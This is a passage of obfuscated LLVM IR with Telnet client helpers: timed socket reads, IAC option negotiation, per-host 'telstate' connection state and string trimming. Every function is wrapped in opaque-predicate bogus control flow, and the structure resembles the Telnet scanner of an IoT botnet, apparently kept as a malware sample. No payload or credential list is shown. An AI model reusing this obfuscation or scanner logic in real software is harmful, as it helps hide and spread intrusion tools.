  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* @x.13
  %36 = load i32, i32* @y.14
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %44 = getelementptr inbounds [16 x i64], [16 x i64]* %43, i64 0, i64 0
  %45 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %44) #5, !srcloc !1
  %46 = extractvalue { i64, i64* } %45, 0
  %47 = extractvalue { i64, i64* } %45, 1
  %48 = trunc i64 %46 to i32
  store i32 %48, i32* %20, align 4
  %49 = ptrtoint i64* %47 to i64
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %21, align 4
  %51 = load i32, i32* @x.13
  %52 = load i32, i32* @y.14
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %59

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load i32, i32* %14, align 4
  %61 = srem i32 %60, 64
  %62 = zext i32 %61 to i64
  %63 = shl i64 1, %62
  %64 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %65 = load i32, i32* %14, align 4
  %66 = sdiv i32 %65, 64
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [16 x i64], [16 x i64]* %64, i64 0, i64 %67
  %69 = load i64, i64* %68, align 8
  %70 = or i64 %69, %63
  store i64 %70, i64* %68, align 8
  %71 = load i32, i32* %14, align 4
  %72 = add nsw i32 %71, 1
  %73 = call i32 @select(i32 %72, %struct.fd_set* %18, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %19)
  %74 = icmp slt i32 %73, 1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %59
  store i32 0, i32* %13, align 4
  br label %83

; <label>:76:                                     ; preds = %59
  %77 = load i32, i32* %14, align 4
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %17, align 4
  %80 = sext i32 %79 to i64
  %81 = call i64 @recv(i32 %77, i8* %78, i64 %80, i32 0)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %13, align 4
  br label %83

; <label>:83:                                     ; preds = %76, %75
  %84 = load i32, i32* @x.13
  %85 = load i32, i32* @y.14
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = load i32, i32* %13, align 4
  %93 = load i32, i32* @x.13
  %94 = load i32, i32* @y.14
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %92

originalBBalteredBB:                              ; preds = %originalBB, %4
  %101 = alloca i32, align 4
  %102 = alloca i32, align 4
  %103 = alloca i32, align 4
  %104 = alloca i8*, align 8
  %105 = alloca i32, align 4
  %106 = alloca %struct.fd_set, align 8
  %107 = alloca %struct.timeval, align 8
  %108 = alloca i32, align 4
  %109 = alloca i32, align 4
  store i32 %0, i32* %102, align 4
  store i32 %1, i32* %103, align 4
  store i8* %2, i8** %104, align 8
  store i32 %3, i32* %105, align 4
  %110 = getelementptr inbounds %struct.timeval, %struct.timeval* %107, i32 0, i32 0
  store i64 0, i64* %110, align 8
  %111 = load i32, i32* %103, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.timeval, %struct.timeval* %107, i32 0, i32 1
  store i64 %112, i64* %113, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %114 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %115 = getelementptr inbounds [16 x i64], [16 x i64]* %114, i64 0, i64 0
  %116 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %115) #5, !srcloc !1
  %117 = extractvalue { i64, i64* } %116, 0
  %118 = extractvalue { i64, i64* } %116, 1
  %119 = trunc i64 %117 to i32
  store i32 %119, i32* %20, align 4
  %120 = ptrtoint i64* %118 to i64
  %121 = trunc i64 %120 to i32
  store i32 %121, i32* %21, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %122 = load i32, i32* %13, align 4
  br label %originalBB6
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i32, i32* @x.15
  %33 = load i32, i32* @y.16
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load i8*, i8** %9, align 8
  %41 = load i8**, i8*** %11, align 8
  %42 = call i32 @contains_string(i8* %40, i8** %41)
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.15
  %45 = load i32, i32* @y.16
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %53

; <label>:52:                                     ; preds = %originalBBpart2
  store i32 1, i32* %6, align 4
  br label %54

; <label>:53:                                     ; preds = %originalBBpart2
  store i32 0, i32* %6, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %52
  %55 = load i32, i32* %6, align 4
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %31
  %56 = load i8*, i8** %9, align 8
  %57 = load i8**, i8*** %11, align 8
  %58 = call i32 @contains_string(i8* %56, i8** %57)
  %59 = icmp ne i32 %58, 0
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.17
  %5 = load i32, i32* @y.18
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.17
  %22 = load i32, i32* @y.18
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %109 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %111

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  store i8 -1, i8* %16, align 1
  %31 = load i32, i32* %13, align 4
  %32 = call i64 @send(i32 %31, i8* %16, i64 1, i32 16384)
  %33 = load i8*, i8** %14, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 252, %36
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %30
  store i8 -2, i8* %16, align 1
  br label %102

; <label>:39:                                     ; preds = %30
  %40 = load i8*, i8** %14, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %39
  %46 = load i32, i32* @x.17
  %47 = load i32, i32* @y.18
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  store i8 -4, i8* %16, align 1
  %54 = load i32, i32* @x.17
  %55 = load i32, i32* @y.18
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %101

; <label>:62:                                     ; preds = %39
  %63 = load i8*, i8** %14, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 3, %66
  br i1 %67, label %68, label %76

; <label>:68:                                     ; preds = %62
  %69 = load i8*, i8** %14, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 251, i32 253
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %16, align 1
  br label %84

; <label>:76:                                     ; preds = %62
  %77 = load i8*, i8** %14, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 253
  %82 = select i1 %81, i32 252, i32 254
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %16, align 1
  br label %84

; <label>:84:                                     ; preds = %76, %68
  %85 = load i32, i32* @x.17
  %86 = load i32, i32* @y.18
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  %93 = load i32, i32* @x.17
  %94 = load i32, i32* @y.18
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %101

; <label>:101:                                    ; preds = %originalBBpart28, %originalBBpart24
  br label %102

; <label>:102:                                    ; preds = %101, %38
  %103 = load i32, i32* %13, align 4
  %104 = call i64 @send(i32 %103, i8* %16, i64 1, i32 16384)
  %105 = load i32, i32* %13, align 4
  %106 = load i8*, i8** %14, align 8
  %107 = getelementptr inbounds i8, i8* %106, i64 2
  %108 = call i64 @send(i32 %105, i8* %107, i64 1, i32 16384)
  br label %110

; <label>:109:                                    ; preds = %originalBBpart2
  br label %110

; <label>:110:                                    ; preds = %109, %102
  store i32 0, i32* %12, align 4
  br label %111

; <label>:111:                                    ; preds = %110, %29
  %112 = load i32, i32* %12, align 4
  ret i32 %112

originalBBalteredBB:                              ; preds = %originalBB, %3
  %113 = alloca i32, align 4
  %114 = alloca i32, align 4
  %115 = alloca i8*, align 8
  %116 = alloca i32, align 4
  %117 = alloca i8, align 1
  store i32 %0, i32* %114, align 4
  store i8* %1, i8** %115, align 8
  store i32 %2, i32* %116, align 4
  %118 = load i8*, i8** %115, align 8
  %119 = getelementptr inbounds i8, i8* %118, i64 1
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  store i8 -4, i8* %16, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  br label %originalBB6
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load i32, i32* @x.21
  %14 = load i32, i32* @y.22
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %22 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %21, i32 0, i32 7
  store i32 0, i32* %22, align 8
  %23 = load i32, i32* %4, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %25, i32 0, i32 2
  store i8 %24, i8* %26, align 8
  %27 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %28 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i32 0, i32 9
  %29 = load i8*, i8** %28, align 8
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 1024, i32 1, i1 false)
  %30 = load i32, i32* @x.21
  %31 = load i32, i32* @y.22
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %12
  %38 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %38, i32 0, i32 7
  store i32 0, i32* %39, align 8
  %40 = load i32, i32* %4, align 4
  %41 = trunc i32 %40 to i8
  %42 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i32 0, i32 2
  store i8 %41, i8* %43, align 8
  %44 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 9
  %46 = load i8*, i8** %45, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* @x.25
  %24 = load i32, i32* @y.26
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  %31 = load i32, i32* @x.25
  %32 = load i32, i32* @y.26
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %originalBBpart221, %originalBBpart2
  %40 = load i32, i32* %5, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp sge i32 %40, %41
  br i1 %42, label %43, label %68

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* @x.25
  %45 = load i32, i32* @y.26
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i8*, i8** %2, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = call i32 @isspace(i32 %57) #9
  %59 = icmp ne i32 %58, 0
  %60 = load i32, i32* @x.25
  %61 = load i32, i32* @y.26
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:68:                                     ; preds = %originalBBpart24, %39
  %69 = phi i1 [ false, %39 ], [ %59, %originalBBpart24 ]
  br i1 %69, label %70, label %89

; <label>:70:                                     ; preds = %68
  %71 = load i32, i32* @x.25
  %72 = load i32, i32* @y.26
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, -1
  store i32 %80, i32* %5, align 4
  %81 = load i32, i32* @x.25
  %82 = load i32, i32* @y.26
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart221, label %originalBB6alteredBB

originalBBpart221:                                ; preds = %originalBB6
  br label %39

; <label>:89:                                     ; preds = %68
  %90 = load i32, i32* @x.25
  %91 = load i32, i32* @y.26
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %89
  %98 = load i32, i32* %4, align 4
  store i32 %98, i32* %3, align 4
  %99 = load i32, i32* @x.25
  %100 = load i32, i32* @y.26
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %107

; <label>:107:                                    ; preds = %123, %originalBBpart225
  %108 = load i32, i32* %3, align 4
  %109 = load i32, i32* %5, align 4
  %110 = icmp sle i32 %108, %109
  br i1 %110, label %111, label %126

; <label>:111:                                    ; preds = %107
  %112 = load i8*, i8** %2, align 8
  %113 = load i32, i32* %3, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %2, align 8
  %118 = load i32, i32* %3, align 4
  %119 = load i32, i32* %4, align 4
  %120 = sub nsw i32 %118, %119
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %117, i64 %121
  store i8 %116, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %111
  %124 = load i32, i32* %3, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %3, align 4
  br label %107

; <label>:126:                                    ; preds = %107
  %127 = load i8*, i8** %2, align 8
  %128 = load i32, i32* %3, align 4
  %129 = load i32, i32* %4, align 4
  %130 = sub nsw i32 %128, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %127, i64 %131
  store i8 0, i8* %132, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %22
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %133 = load i8*, i8** %2, align 8
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %133, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = call i32 @isspace(i32 %138) #9
  %140 = icmp ne i32 %139, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %141 = load i32, i32* %5, align 4
  %_ = sub i32 0, %141
  %gen = add i32 %_, -1
  %_7 = sub i32 0, %141
  %gen8 = add i32 %_7, -1
  %_9 = sub i32 %141, -1
  %gen10 = mul i32 %_9, -1
  %_11 = sub i32 %141, -1
  %gen12 = mul i32 %_11, -1
  %_13 = sub i32 %141, -1
  %gen14 = mul i32 %_13, -1
  %_15 = sub i32 %141, -1
  %gen16 = mul i32 %_15, -1
  %_17 = shl i32 %141, -1
  %_18 = sub i32 %141, -1
  %gen19 = mul i32 %_18, -1
  %142 = add nsw i32 %141, -1
  store i32 %142, i32* %5, align 4
  br label %originalBB6

originalBB23alteredBB:                            ; preds = %originalBB23, %89
  %143 = load i32, i32* %4, align 4
  store i32 %143, i32* %3, align 4
  br label %originalBB23
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = load i32, i32* @x.27
  %3 = load i32, i32* @y.28
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %10, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %16 = call i32 @print(i8** null, i8* %14, %struct.__va_list_tag* %15)
  %17 = load i32, i32* @x.27
  %18 = load i32, i32* @y.28
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %16

originalBBalteredBB:                              ; preds = %originalBB, %1
  %25 = alloca i8*, align 8
  %26 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %25, align 8
  %27 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %28 = bitcast %struct.__va_list_tag* %27 to i8*
  call void @llvm.va_start(i8* %28)
  %29 = load i8*, i8** %25, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %31 = call i32 @print(i8** null, i8* %29, %struct.__va_list_tag* %30)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = load i32, i32* @x.29
  %5 = load i32, i32* @y.30
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
